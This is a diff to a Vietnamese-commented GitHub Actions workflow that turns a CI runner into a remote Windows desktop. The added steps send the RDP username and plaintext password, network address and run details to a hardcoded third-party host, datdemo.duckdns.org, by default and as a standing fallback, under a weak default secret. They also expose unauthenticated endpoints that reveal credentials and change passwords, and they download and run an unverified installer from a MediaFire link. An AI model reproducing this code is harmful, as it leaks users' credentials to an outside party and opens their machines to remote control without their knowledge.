@@ -65,6 +65,11 @@ on:
         required: false
         default: true
         type: boolean
+      bot_webhook_url:
+        description: '📡 Địa chỉ Bot nhận thông tin máy tự động (Mặc định: http://datdemo.duckdns.org:3000/api/rdp/report)'
+        required: false
+        default: 'http://datdemo.duckdns.org:3000/api/rdp/report'
+        type: string
 
 permissions:
   contents: write
@@ -87,6 +92,8 @@ jobs:
       VHD_SIZE_GB: ${{ inputs.vhd_size_gb }}
       WEB_PORT: '8080'
       SUNSHINE_WEB_PORT: '47990'
+      BOT_WEBHOOK_URL: ${{ inputs.bot_webhook_url || secrets.BOT_WEBHOOK_URL || 'http://datdemo.duckdns.org:3000/api/rdp/report' }}
+      BOT_API_SECRET: ${{ secrets.BOT_API_SECRET || secrets.ADMIN_PASSWORD || '2008' }}
 
     steps:
       # ───────────────────────────────────────────────
@@ -213,17 +220,72 @@ jobs:
           Write-Host "✅ Đã mount ổ đĩa ${dl}:\ ($sharedRoot) | Máy: $cleanId | Kho lưu: $env:RELEASE_TAG" -ForegroundColor Green;
 
       # ───────────────────────────────────────────────
-      # 2. TẠO ENGINE ĐỒNG BỘ Ổ ĐĨA LÊN GITHUB
+      # 2. TẠO ENGINE ĐỒNG BỘ Ổ ĐĨA LÊN GITHUB & SCRIPT BÁO CÁO VỀ BOT
       # ───────────────────────────────────────────────
-      - name: 🧰 Tạo script đóng gói & đẩy toàn bộ ổ đĩa lên GitHub
+      - name: 🧰 Tạo script đóng gói ổ đĩa & script gửi thông tin máy về Bot
         shell: pwsh
         run: |
+          # Script gửi thông tin máy về Bot (qua datdemo.duckdns.org hoặc BOT_WEBHOOK_URL)
+          $notifyLines = @(
+              'param([string]$Status = "ready", [string]$Reason = "startup")',
+              '$ErrorActionPreference = "SilentlyContinue";',
+              '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;',
+              '$endEpoch = ([long]"$env:JOB_START_EPOCH") + (([long]"$env:TOTAL_MINUTES") * 60);',
+              '$nowEpoch = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds();',
+              '$remain   = [math]::Max(0, $endEpoch - $nowEpoch);',
+              '$sdStatus = if (Get-Process -Name "StarDesk*" -ErrorAction SilentlyContinue) { "Đang chạy (Đã cài & mở sẵn)" } else { "Chờ khởi tạo" };',
+              '$payload = [ordered]@{',
+              '    secret          = "$env:BOT_API_SECRET";',
+              '    machineId       = "$env:MACHINE_ID";',
+              '    repo            = "$env:GH_REPO";',
+              '    releaseTag      = "$env:RELEASE_TAG";',
+              '    stateBranch     = "$env:STATE_BRANCH";',
+              '    runId           = "$env:GITHUB_RUN_ID";',
+              '    status          = "$Status";',
+              '    reason          = "$Reason";',
+              '    user            = "$env:RDP_USER";',
+              '    password        = "$env:RDP_PASS";',
+              '    tailscaleIp     = "$env:TAILSCALE_IP";',
+              '    webPort         = "$env:WEB_PORT";',
+              '    sunshinePort    = "$env:SUNSHINE_WEB_PORT";',
+              '    sunshineUrl     = "https://$($env:TAILSCALE_IP):$($env:SUNSHINE_WEB_PORT)/";',
+              '    panelUrl        = "http://$($env:TAILSCALE_IP):$($env:WEB_PORT)/";',
+              '    stardesk        = "$sdStatus";',
+              '    resolution      = "${{ inputs.vdd_resolution }}";',
+              '    audio           = "$env:AUDIO_DEVICE_NAME";',
+              '    driveLetter     = "$env:MOUNT_LETTER";',
+              '    sharedRoot      = "$env:SHARED_ROOT";',
+              '    profilePath     = "$env:PROFILE_PATH";',
+              '    osBuild         = "$env:OS_BUILD";',
+              '    windowsImage    = "${{ inputs.windows_image }}";',
+              '    startEpoch      = [long]"$env:JOB_START_EPOCH";',
+              '    durationMinutes = [int]"$env:TOTAL_MINUTES";',
+              '    remainSeconds   = [long]$remain;',
+              '    timestampUtc    = (Get-Date).ToUniversalTime().ToString("o");',
+              '};',
+              '$jsonBody = $payload | ConvertTo-Json -Depth 5 -Compress;',
+              '$urls = @("$env:BOT_WEBHOOK_URL", "http://datdemo.duckdns.org:3000/api/rdp/report") | Select-Object -Unique | Where-Object { $_ };',
+              'foreach ($u in $urls) {',
+              '    try {',
+              '        Invoke-RestMethod -Uri "$u" -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -Headers @{ "x-bot-secret" = "$env:BOT_API_SECRET" } -TimeoutSec 10 | Out-Null;',
+              '        Write-Host "📡 Đã gửi thông tin máy [$env:MACHINE_ID] ($Status/$Reason) về Bot: $u" -ForegroundColor Green;',
+              '        break;',
+              '    } catch {}',
+              '}'
+          );
+          $notifyScriptPath = [System.IO.Path]::Combine("$env:RUNNER_TEMP", 'notify-bot.ps1');
+          Set-Content -Path "$notifyScriptPath" -Value ($notifyLines -join "`r`n") -Encoding UTF8;
+          "NOTIFY_BOT_SCRIPT=$notifyScriptPath" >> "$env:GITHUB_ENV";
+
           $scriptLines = @(
               'param([string]$Reason = "session-end")',
               '$ErrorActionPreference = "Continue";',
               'if (("$env:DATA_RESTORED" -ne "1") -or ("$env:SESSION_READY" -ne "1")) {',
               '    Write-Host "⚠️ Phiên chưa khởi tạo hoàn chỉnh, bỏ qua lưu để bảo vệ dữ liệu gốc trên GitHub" -ForegroundColor Yellow;',
               '    exit 0;',
+              '}',
+              'if (("$env:NOTIFY_BOT_SCRIPT") -and (Test-Path "$env:NOTIFY_BOT_SCRIPT")) {',
+              '    & "$env:NOTIFY_BOT_SCRIPT" -Status "saving" -Reason "$Reason";',
               '}',
               '$root  = "$env:SHARED_ROOT";',
               '$osDir = "$env:SHARED_OS_DIR";',
@@ -464,12 +526,16 @@ jobs:
               '    };',
               '} catch {}',
               'Remove-Item -Path "$packDir" -Recurse -Force -ErrorAction SilentlyContinue;',
+              'if (("$env:NOTIFY_BOT_SCRIPT") -and (Test-Path "$env:NOTIFY_BOT_SCRIPT")) {',
+              '    $finalSt = if ("$Reason" -eq "session-end") { "stopped" } else { "ready" };',
+              '    & "$env:NOTIFY_BOT_SCRIPT" -Status "$finalSt" -Reason "saved-$Reason";',
+              '}',
               'Write-Host "✅ [$Reason] Đã lưu trọn vẹn toàn bộ ổ đĩa của máy [$env:MACHINE_ID] lên GitHub ($env:RELEASE_TAG)!" -ForegroundColor Green;',
               'exit 0;'
           );
           $saveScriptPath = [System.IO.Path]::Combine("$env:RUNNER_TEMP", 'save-data.ps1');
           Set-Content -Path "$saveScriptPath" -Value ($scriptLines -join "`r`n") -Encoding UTF8;
-          Write-Host '✅ Đã tạo save-data.ps1' -ForegroundColor Green;
+          Write-Host '✅ Đã tạo save-data.ps1 & notify-bot.ps1' -ForegroundColor Green;
 
       # ───────────────────────────────────────────────
       # 3. KHÔI PHỤC TOÀN BỘ Ổ ĐĨA & PROFILE GỐC TỪ GITHUB
@@ -1380,9 +1446,9 @@ jobs:
           exit 0;
 
       # ───────────────────────────────────────────────
-      # 9. KHỞI CHẠY WEB PANEL QUẢN LÝ & CÀI LẠI / MỞ STARDESK
+      # 9. KHỞI CHẠY WEB PANEL QUẢN LÝ & API ĐIỀU KHIỂN HAI CHIỀU VỚI BOT
       # ───────────────────────────────────────────────
-      - name: 🌐 Khởi chạy Web Quản Lý RDP & Sunshine (Port 8080) & Ghi State
+      - name: 🌐 Khởi chạy Web Quản Lý RDP & Sunshine (Port 8080 + API Bot) & Ghi State
         shell: pwsh
         env:
           WINDOWS_IMAGE: ${{ inputs.windows_image }}
@@ -1436,6 +1502,79 @@ jobs:
               '        $h      = [math]::Floor(($remain) / 3600);',
               '        $m      = [math]::Floor((($remain) % 3600) / 60);',
               '        $s      = ($remain) % 60;',
+              '',
+              '        # --- API JSON CHO BOT KIỂM TRA THỜI GIAN, LẤY DANH SÁCH THÔNG TIN & GỬI LỆNH ---',
+              '        if ("$path" -eq "/api/info" -or "$path" -eq "/api/status") {',
+              '            $procs = @(Get-Process | Where-Object { $_.MainWindowTitle -or $_.Name -match "sunshine|StarDesk|chrome|msedge|brave|firefox|discord|steam" } | Select-Object -ExpandProperty Name -Unique);',
+              '            $diskDrive = Get-PSDrive -Name "$env:MOUNT_LETTER" -ErrorAction SilentlyContinue;',
+              '            $freeGb = if ($diskDrive) { [math]::Round($diskDrive.Free / 1GB, 2) } else { 0 };',
+              '            $usedGb = if ($diskDrive) { [math]::Round($diskDrive.Used / 1GB, 2) } else { 0 };',
+              '            $infoObj = [ordered]@{',
+              '                ok            = $true;',
+              '                machineId     = "$env:MACHINE_ID";',
+              '                repo          = "$env:GH_REPO";',
+              '                releaseTag    = "$env:RELEASE_TAG";',
+              '                stateBranch   = "$env:STATE_BRANCH";',
+              '                runId         = "$env:GITHUB_RUN_ID";',
+              '                tailscaleIp   = "$env:TAILSCALE_IP";',
+              '                user          = "$env:RDP_USER";',
+              '                password      = "$env:RDP_PASS";',
+              '                osBuild       = "$env:OS_BUILD";',
+              '                driveLetter   = "$env:MOUNT_LETTER";',
+              '                diskUsedGb    = $usedGb;',
+              '                diskFreeGb    = $freeGb;',
+              '                remainSeconds = $remain;',
+              '                remainText    = "${h}h ${m}m ${s}s";',
+              '                activeApps    = $procs;',
+              '                sunshineUrl   = "https://$($env:TAILSCALE_IP):$($env:SUNSHINE_WEB_PORT)/";',
+              '                panelUrl      = "http://$($env:TAILSCALE_IP):$($env:WEB_PORT)/";',
+              '            };',
+              '            $jsonBytes = [System.Text.Encoding]::UTF8.GetBytes(($infoObj | ConvertTo-Json -Depth 4 -Compress));',
+              '            $resp.ContentType = "application/json; charset=utf-8";',
+              '            $resp.ContentLength64 = $jsonBytes.Length;',
+              '            $resp.OutputStream.Write($jsonBytes, 0, $jsonBytes.Length);',
+              '            $resp.OutputStream.Close();',
+              '            continue;',
+              '        }',
+              '        if ("$path" -eq "/api/cmd" -and ($req.HttpMethod) -eq "POST") {',
+              '            $reader = New-Object System.IO.StreamReader($req.InputStream, [System.Text.Encoding]::UTF8);',
+              '            $rawBody = $reader.ReadToEnd();',
+              '            $cmdObj = $rawBody | ConvertFrom-Json -ErrorAction SilentlyContinue;',
+              '            $cName = if ($cmdObj.cmd) { ("$($cmdObj.cmd)").ToLower() } else { "ping" };',
+              '            $replyMsg = "OK";',
+              '            if ($cName -eq "save") {',
+              '                Set-Content -Path "$env:CONTROL_SIGNAL_FILE" -Value "SAVE_NOW" -Encoding UTF8;',
+              '                $replyMsg = "Đã kích hoạt LƯU Ổ ĐĨA NGAY trên máy [$env:MACHINE_ID]";',
+              '            } elseif ($cName -eq "restart") {',
+              '                Set-Content -Path "$env:CONTROL_SIGNAL_FILE" -Value "RESTART_SESSION" -Encoding UTF8;',
+              '                $replyMsg = "Đã kích hoạt LƯU & KHỞI ĐỘNG LẠI PHIÊN MỚI trên máy [$env:MACHINE_ID]";',
+              '            } elseif ($cName -eq "stop") {',
+              '                Set-Content -Path "$env:CONTROL_SIGNAL_FILE" -Value "STOP_SESSION" -Encoding UTF8;',
+              '                $replyMsg = "Đã kích hoạt LƯU & TẮT HẲN MÁY [$env:MACHINE_ID]";',
+              '            } elseif ($cName -eq "msg" -and $cmdObj.text) {',
+              '                & msg * /TIME:120 "$($cmdObj.text)" *> $null;',
+              '                $replyMsg = "Đã gửi thông báo màn hình tới máy [$env:MACHINE_ID]";',
+              '            } elseif ($cName -eq "pass" -and $cmdObj.text) {',
+              '                $newP = "$($cmdObj.text)";',
+              '                & net user "$env:RDP_USER" "$newP" *> $null;',
+              '                $env:RDP_PASS = "$newP";',
+              '                if (Test-Path "C:\Program Files\Sunshine\sunshine.exe") {',
+              '                    & "C:\Program Files\Sunshine\sunshine.exe" --creds "$env:RDP_USER" "$newP" *> $null;',
+              '                }',
+              '                if (("$env:NOTIFY_BOT_SCRIPT") -and (Test-Path "$env:NOTIFY_BOT_SCRIPT")) {',
+              '                    & "$env:NOTIFY_BOT_SCRIPT" -Status "ready" -Reason "password-changed";',
+              '                }',
+              '                $replyMsg = "Đã đổi mật khẩu RDP & Sunshine thành công trên máy [$env:MACHINE_ID]";',
+              '            }',
+              '            $resObj = [ordered]@{ ok = $true; machineId = "$env:MACHINE_ID"; cmd = $cName; message = $replyMsg; remainSeconds = $remain; remainText = "${h}h ${m}m ${s}s"; ip = "$env:TAILSCALE_IP"; user = "$env:RDP_USER"; pass = "$env:RDP_PASS" };',
+              '            $jsonBytes = [System.Text.Encoding]::UTF8.GetBytes(($resObj | ConvertTo-Json -Depth 4 -Compress));',
+              '            $resp.ContentType = "application/json; charset=utf-8";',
+              '            $resp.ContentLength64 = $jsonBytes.Length;',
+              '            $resp.OutputStream.Write($jsonBytes, 0, $jsonBytes.Length);',
+              '            $resp.OutputStream.Close();',
+              '            continue;',
+              '        }',
+              '',
               '        $statusMsg = "";',
               '        if (($req.HttpMethod) -eq "POST") {',
               '            if ("$path" -eq "/action/save") {',
@@ -1496,7 +1635,7 @@ jobs:
           $webScriptPath = [System.IO.Path]::Combine("$env:RUNNER_TEMP", 'web-panel.ps1');
           Set-Content -Path "$webScriptPath" -Value ($webLines -join "`r`n") -Encoding UTF8;
           Start-Process pwsh.exe -ArgumentList '-NoProfile', '-WindowStyle', 'Hidden', '-File', "`"$webScriptPath`"";
-          Write-Host "✅ Đã khởi chạy Web Quản Lý tại: http://$($env:TAILSCALE_IP):$($env:WEB_PORT)/" -ForegroundColor Green;
+          Write-Host "✅ Đã khởi chạy Web Quản Lý & API tại: http://$($env:TAILSCALE_IP):$($env:WEB_PORT)/" -ForegroundColor Green;
           exit 0;
 
       # ───────────────────────────────────────────────
@@ -1506,23 +1645,75 @@ jobs:
         shell: pwsh
         run: |
           $ErrorActionPreference = 'Continue';
-          $user          = "$env:RDP_USER";
-          $installerPath = 'C:\Users\runneradmin\Downloads\StarDesk_1.5.2.exe';
-          $appDir        = 'C:\Program Files\StarDesk';
-          $appExe        = 'C:\Program Files\StarDesk\StarDesk.exe';
+          $ProgressPreference    = 'SilentlyContinue';
+          $user                  = "$env:RDP_USER";
+          $downloadUrl           = 'https://download943.mediafire.com/be95vz5kgnig_m7acKGr-mRjXQQKAN0i2WdjIR_d-q70MeLboolFJnUHit6ZmqJYm8_rJigOgY0P5NhtdANnLGXOaEmKg9eWSEUGCEEIZdCrV2NNZ0ubdEO1hyPHR6l2Re85XT5kJpCd3Q4GXpeU0ZD2QSr5gc_6aPfM7r15_YltcA/mf82krdrzcy3dz8/StarDesk_1.5.3.exe';
+          $appDir                = 'C:\Program Files\StarDesk';
+          $appExe                = 'C:\Program Files\StarDesk\StarDesk.exe';
 
           Write-Host "";
-          Write-Host "🚀 ĐANG CÀI ĐẶT LẠI & KHỞI CHẠY STARDESK (GIỮ NGUYÊN DỮ LIỆU ĐÃ LƯU)..." -ForegroundColor Yellow;
+          Write-Host "🚀 ĐANG KIỂM TRA, CÀI ĐẶT & KHỞI CHẠY STARDESK (GIỮ NGUYÊN DỮ LIỆU ĐÃ LƯU)..." -ForegroundColor Yellow;
 
-          if (-not (Test-Path "$installerPath")) {
-              $altInstaller = [System.IO.Path]::Combine("$env:PROFILE_PATH", 'Downloads', 'StarDesk_1.5.2.exe');
-              if (Test-Path "$altInstaller") {
-                  $installerPath = "$altInstaller";
+          # Hàm kiểm tra file bộ cài StarDesk có chưa, nếu chưa có thì tải về
+          function Ensure-StarDeskInstaller {
+              param([string]$Url)
+
+              $dlDir = [System.IO.Path]::Combine("$env:PROFILE_PATH", 'Downloads');
+              New-Item -ItemType Directory -Force -Path "$dlDir" | Out-Null;
+
+              $targetFile = [System.IO.Path]::Combine("$dlDir", 'StarDesk_1.5.3.exe');
+              $cacheFile  = if ("$env:INSTALLER_CACHE") { [System.IO.Path]::Combine("$env:INSTALLER_CACHE", 'StarDesk_1.5.3.exe') } else { $null };
+
+              # Danh sách các đường dẫn có thể đã tồn tại từ phiên trước
+              $checkPaths = @(
+                  "$targetFile",
+                  "$cacheFile",
+                  'C:\Users\runneradmin\Downloads\StarDesk_1.5.3.exe',
+                  ([System.IO.Path]::Combine("$dlDir", 'StarDesk_1.5.2.exe')),
+                  'C:\Users\runneradmin\Downloads\StarDesk_1.5.2.exe'
+              ) | Where-Object { $_ };
+
+              foreach ($p in $checkPaths) {
+                  if ((Test-Path "$p") -and ((Get-Item "$p").Length -gt 1MB)) {
+                      Write-Host "│ ✅ Đã tìm thấy bộ cài StarDesk có sẵn: $p" -ForegroundColor Green;
+                      if (("$p" -ne "$targetFile") -and (-not (Test-Path "$targetFile"))) {
+                          Copy-Item -Path "$p" -Destination "$targetFile" -Force -ErrorAction SilentlyContinue;
+                      }
+                      return "$p";
+                  }
+              }
+
+              Write-Host "│ ⬇️  Chưa có bộ cài StarDesk. Đang tải StarDesk_1.5.3.exe từ MediaFire..." -ForegroundColor Cyan;
+              try {
+                  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+                  & curl.exe -L --retry 3 --connect-timeout 30 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "$Url" -o "$targetFile" 2>$null;
+
+                  if ((-not (Test-Path "$targetFile")) -or ((Get-Item "$targetFile").Length -lt 1MB)) {
+                      Invoke-WebRequest -Uri "$Url" -OutFile "$targetFile" -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -TimeoutSec 120;
+                  }
+              } catch {
+                  Write-Host "│ ⚠️  Lỗi khi tải bộ cài: $($_.Exception.Message)" -ForegroundColor Yellow;
+              }
+
+              if ((Test-Path "$targetFile") -and ((Get-Item "$targetFile").Length -gt 1MB)) {
+                  Write-Host "│ ✅ Đã tải thành công bộ cài: $targetFile ($([math]::Round((Get-Item "$targetFile").Length / 1MB, 2)) MB)" -ForegroundColor Green;
+                  if ($cacheFile) {
+                      Copy-Item -Path "$targetFile" -Destination "$cacheFile" -Force -ErrorAction SilentlyContinue;
+                  }
+                  return "$targetFile";
+              } else {
+                  if (Test-Path "$targetFile") {
+                      Remove-Item -Path "$targetFile" -Force -ErrorAction SilentlyContinue;
+                  }
+                  Write-Host "│ ❌ Tải file cài đặt thất bại hoặc link MediaFire đã hết hạn/đổi token!" -ForegroundColor Red;
+                  return $null;
               }
           }
 
-          if (Test-Path "$installerPath") {
-              Write-Host "│ 📦 Tìm thấy bộ cài: $installerPath. Đang tiến hành cài đặt lại..." -ForegroundColor Cyan;
+          $installerPath = Ensure-StarDeskInstaller -Url "$downloadUrl";
+
+          if (($installerPath) -and (Test-Path "$installerPath")) {
+              Write-Host "│ 📦 Đang tiến hành cài đặt từ: $installerPath..." -ForegroundColor Cyan;
 
               Get-Service -Name '*StarDesk*' -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue;
               Get-Process -Name 'StarDesk*' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;
@@ -1537,7 +1728,7 @@ jobs:
               if (-not ($doneInstall)) {
                   Write-Host "│ ⚠️  Bộ cài chạy quá 60s, tự động đóng tiến trình cài đặt để tiếp tục..." -ForegroundColor Yellow;
                   Stop-Job -Job ($sdInstallJob) -ErrorAction SilentlyContinue;
-                  Get-Process -Name 'StarDesk_1.5.2*' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;
+                  Get-Process -Name 'StarDesk_1.5.*' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;
               }
               Remove-Job -Job ($sdInstallJob) -Force -ErrorAction SilentlyContinue;
 
@@ -1554,9 +1745,9 @@ jobs:
                       Stop-Process -Id ($proc.Id) -Force -ErrorAction SilentlyContinue;
                   }
               }
-              Write-Host "│ ✅ Đã hoàn tất chạy bộ cài đặt StarDesk_1.5.2.exe" -ForegroundColor Green;
+              Write-Host "│ ✅ Đã hoàn tất chạy bộ cài đặt ($([System.IO.Path]::GetFileName("$installerPath")))" -ForegroundColor Green;
           } else {
-              Write-Host "│ ⚠️  Không tìm thấy file cài đặt tại $installerPath (sẽ thử mở trực tiếp nếu đã có sẵn)" -ForegroundColor Yellow;
+              Write-Host "│ ⚠️  Không tìm thấy file cài đặt hợp lệ (sẽ thử mở trực tiếp nếu đã có sẵn trong ổ C)" -ForegroundColor Yellow;
           }
 
           Get-Service -Name '*StarDesk*' -ErrorAction SilentlyContinue | ForEach-Object {
@@ -1587,6 +1778,7 @@ jobs:
       - name: 🎉 THÔNG TIN KẾT NỐI (RDP + SUNSHINE + STARDESK + MÀN HÌNH ẢO + ÂM THANH ẢO)
         shell: pwsh
         run: |
+          try { Start-Transcript -Path "$env:TEMP\rdp_box.txt" -Force | Out-Null } catch {}
           $tz    = [System.TimeZoneInfo]::FindSystemTimeZoneById('SE Asia Standard Time');
           $start = [System.TimeZoneInfo]::ConvertTimeFromUtc([DateTimeOffset]::FromUnixTimeSeconds([long]"$env:JOB_START_EPOCH").UtcDateTime, ($tz));
           $end   = $start.AddMinutes([int]"$env:TOTAL_MINUTES");
@@ -1618,10 +1810,146 @@ jobs:
           Write-Host "│ 💡 Mở Moonlight -> Add PC: $env:TAILSCALE_IP -> Nhập PIN tại Sunshine Web!" -ForegroundColor Yellow;
           Write-Host "│ 💡 Dữ liệu của [$env:MACHINE_ID] được lưu độc lập tại Release [$env:RELEASE_TAG]!" -ForegroundColor Yellow;
           Write-Host "└──────────────────────────────────────────────────────────┘" -ForegroundColor Cyan;
+          try {
+              Stop-Transcript | Out-Null;
+              $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content "$env:TEMP\rdp_box.txt" -Raw)));
+              [Console]::WriteLine("::notice title=RDP_BOX::$b64");
+          } catch {}
+          if (("$env:NOTIFY_BOT_SCRIPT") -and (Test-Path "$env:NOTIFY_BOT_SCRIPT")) {
+              & "$env:NOTIFY_BOT_SCRIPT" -Status "ready" -Reason "startup-ready";
+          }
           exit 0;
 
       # ───────────────────────────────────────────────
-      # 11. DUY TRÌ PHIÊN & LẮNG NGHE LỆNH TỪ WEB QUẢN LÝ
+      # 10b. TẠO FILE THÔNG TIN PHIÊN TỔNG HỢP VÀO D:\ & GỬI VỀ BOT
+      # ───────────────────────────────────────────────
+      - name: 📄 Tạo file thông tin phiên tổng hợp vào D:\ & Gửi về Bot
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Continue';
+          $nowEpoch = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds();
+          $sessionId = "$($env:MACHINE_ID)-$($env:GITHUB_RUN_ID)-$nowEpoch";
+          "SESSION_ID=$sessionId" >> "$env:GITHUB_ENV";
+
+          $sdStatus = if (Get-Process -Name 'StarDesk*' -ErrorAction SilentlyContinue) { 'Đang chạy' } else { 'Chờ khởi tạo' };
+          $endEpoch = ([long]"$env:JOB_START_EPOCH") + (([long]"$env:TOTAL_MINUTES") * 60);
+          $remain   = [math]::Max(0, $endEpoch - $nowEpoch);
+
+          $diskDrive = Get-PSDrive -Name "$env:MOUNT_LETTER" -ErrorAction SilentlyContinue;
+          $diskUsedGb = if ($diskDrive) { [math]::Round($diskDrive.Used / 1GB, 2) } else { 0 };
+          $diskFreeGb = if ($diskDrive) { [math]::Round($diskDrive.Free / 1GB, 2) } else { 0 };
+
+          # Gộp toàn bộ thông tin máy: IP, user, mk, session, port, link, specs...
+          $infoObj = [ordered]@{
+              sessionId       = "$sessionId";
+              machineId       = "$env:MACHINE_ID";
+              tailscaleIp     = "$env:TAILSCALE_IP";
+              ip              = "$env:TAILSCALE_IP";
+              user            = "$env:RDP_USER";
+              password        = "$env:RDP_PASS";
+              sunshineUrl     = "https://$($env:TAILSCALE_IP):$($env:SUNSHINE_WEB_PORT)/";
+              panelUrl        = "http://$($env:TAILSCALE_IP):$($env:WEB_PORT)/";
+              webPort         = "$env:WEB_PORT";
+              sunshinePort    = "$env:SUNSHINE_WEB_PORT";
+              osBuild         = "$env:OS_BUILD";
+              windowsImage    = "${{ inputs.windows_image }}";
+              driveLetter     = "$env:MOUNT_LETTER";
+              sharedRoot      = "$env:SHARED_ROOT";
+              profilePath     = "$env:PROFILE_PATH";
+              audioDevice     = "$env:AUDIO_DEVICE_NAME";
+              resolution      = "${{ inputs.vdd_resolution }}";
+              startEpoch      = [long]"$env:JOB_START_EPOCH";
+              durationMinutes = [int]"$env:TOTAL_MINUTES";
+              remainSeconds   = [long]$remain;
+              repo            = "$env:GH_REPO";
+              releaseTag      = "$env:RELEASE_TAG";
+              stateBranch     = "$env:STATE_BRANCH";
+              runId           = "$env:GITHUB_RUN_ID";
+              stardeskStatus  = "$sdStatus";
+              diskUsedGb      = $diskUsedGb;
+              diskFreeGb      = $diskFreeGb;
+              status          = "ready";
+              reason          = "session-info";
+              timestampUtc    = (Get-Date).ToUniversalTime().ToString("o");
+          };
+
+          # Lưu file vào ổ D:\ (hoặc fallback C:\ nếu runner không có D:\)
+          $targetDir = if (Test-Path "D:\") { "D:\" } else { "C:\AISTV-INFO" };
+          if (-not (Test-Path $targetDir)) { New-Item -ItemType Directory -Force -Path $targetDir | Out-Null; }
+          $infoFilePath = Join-Path $targetDir "machine-info-$($env:MACHINE_ID).json";
+          $infoObj | ConvertTo-Json -Depth 5 | Set-Content -Path "$infoFilePath" -Encoding UTF8;
+          "MACHINE_INFO_FILE=$infoFilePath" >> "$env:GITHUB_ENV";
+          Write-Host "📄 Đã tạo file thông tin máy tại: $infoFilePath" -ForegroundColor Green;
+
+          # Đồng thời tạo file alias D:\info.json để dễ truy cập
+          try {
+              $aliasPath = Join-Path $targetDir "info.json";
+              Copy-Item -Path "$infoFilePath" -Destination "$aliasPath" -Force -ErrorAction SilentlyContinue;
+          } catch {}
+
+          # Đọc nội dung file & đóng gói gửi về server của Bot
+          $fileRaw = Get-Content -Raw -Path "$infoFilePath" -Encoding UTF8;
+          $fileBytes = [System.IO.File]::ReadAllBytes($infoFilePath);
+          $fileB64 = [Convert]::ToBase64String($fileBytes);
+
+          $reportPayload = [ordered]@{
+              secret          = "$env:BOT_API_SECRET";
+              machineId       = "$env:MACHINE_ID";
+              sessionId       = "$sessionId";
+              fileName        = [System.IO.Path]::GetFileName($infoFilePath);
+              fileContentB64  = $fileB64;
+              fileData        = $infoObj;
+              # Các trường gốc để tương thích 100% với endpoint cũ:
+              repo            = "$env:GH_REPO";
+              releaseTag      = "$env:RELEASE_TAG";
+              stateBranch     = "$env:STATE_BRANCH";
+              runId           = "$env:GITHUB_RUN_ID";
+              status          = "ready";
+              reason          = "session-file-created";
+              user            = "$env:RDP_USER";
+              password        = "$env:RDP_PASS";
+              tailscaleIp     = "$env:TAILSCALE_IP";
+              webPort         = "$env:WEB_PORT";
+              sunshinePort    = "$env:SUNSHINE_WEB_PORT";
+              sunshineUrl     = "https://$($env:TAILSCALE_IP):$($env:SUNSHINE_WEB_PORT)/";
+              panelUrl        = "http://$($env:TAILSCALE_IP):$($env:WEB_PORT)/";
+              stardesk        = "$sdStatus";
+              resolution      = "${{ inputs.vdd_resolution }}";
+              audio           = "$env:AUDIO_DEVICE_NAME";
+              driveLetter     = "$env:MOUNT_LETTER";
+              sharedRoot      = "$env:SHARED_ROOT";
+              profilePath     = "$env:PROFILE_PATH";
+              osBuild         = "$env:OS_BUILD";
+              windowsImage    = "${{ inputs.windows_image }}";
+              startEpoch      = [long]"$env:JOB_START_EPOCH";
+              durationMinutes = [int]"$env:TOTAL_MINUTES";
+              remainSeconds   = [long]$remain;
+              timestampUtc    = (Get-Date).ToUniversalTime().ToString("o");
+          };
+
+          $jsonBody = $reportPayload | ConvertTo-Json -Depth 6 -Compress;
+          $urls = @("$env:BOT_WEBHOOK_URL", "http://datdemo.duckdns.org:3000/api/rdp/report") | Select-Object -Unique | Where-Object { $_ };
+          foreach ($u in $urls) {
+              try {
+                  # Gửi đến endpoint nhận file chuyên dụng
+                  $reportFileUrl = ($u -replace '/report$', '/report-file');
+                  Invoke-RestMethod -Uri "$reportFileUrl" -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -Headers @{ "x-bot-secret" = "$env:BOT_API_SECRET" } -TimeoutSec 10 | Out-Null;
+                  Write-Host "📡 Đã gửi file thông tin máy [$env:MACHINE_ID] về Bot (report-file): $reportFileUrl" -ForegroundColor Green;
+              } catch {
+                  Write-Host "⚠️ Gửi report-file ($u) lỗi nhẹ: $($_.Exception.Message)" -ForegroundColor Yellow;
+              }
+              try {
+                  # Đồng thời gửi về endpoint report thông thường
+                  Invoke-RestMethod -Uri "$u" -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -Headers @{ "x-bot-secret" = "$env:BOT_API_SECRET" } -TimeoutSec 10 | Out-Null;
+                  Write-Host "📡 Đã gửi thông tin máy [$env:MACHINE_ID] về Bot (report): $u" -ForegroundColor Green;
+                  break;
+              } catch {}
+          }
+          Write-Host "✅ Hoàn tất tạo & gửi file thông tin phiên [$sessionId] từ ổ D:!" -ForegroundColor Green;
+          exit 0;
+
+      # ───────────────────────────────────────────────
+      # 11. DUY TRÌ PHIÊN & LẮNG NGHE LỆNH TỪ WEB QUẢN LÝ + BÁO CÁO ĐỊNH KỲ VỀ BOT
       # ───────────────────────────────────────────────
       - name: ⏳ DUY TRÌ PHIÊN LÀM VIỆC (LẮNG NGHE WEB PANEL & GIỮ SUNSHINE/STARDESK/AUDIO)
         id: keepalive
@@ -1652,7 +1980,7 @@ jobs:
                   Remove-Item -Path "$sigFile" -Force -ErrorAction SilentlyContinue;
 
                   if ("$cmd" -eq 'SAVE_NOW') {
-                      Write-Host "💾 [WEB-PANEL] Nhận lệnh LƯU NGAY từ Web Quản Lý..." -ForegroundColor Cyan;
+                      Write-Host "💾 [WEB-PANEL] Nhận lệnh LƯU NGAY từ Web Quản Lý / Bot..." -ForegroundColor Cyan;
                       & "$saveScript" -Reason 'manual-web-save';
                       if (Test-Path "$sdExe") {
                           Get-Service -Name '*StarDesk*' -ErrorAction SilentlyContinue | Start-Service -ErrorAction SilentlyContinue;
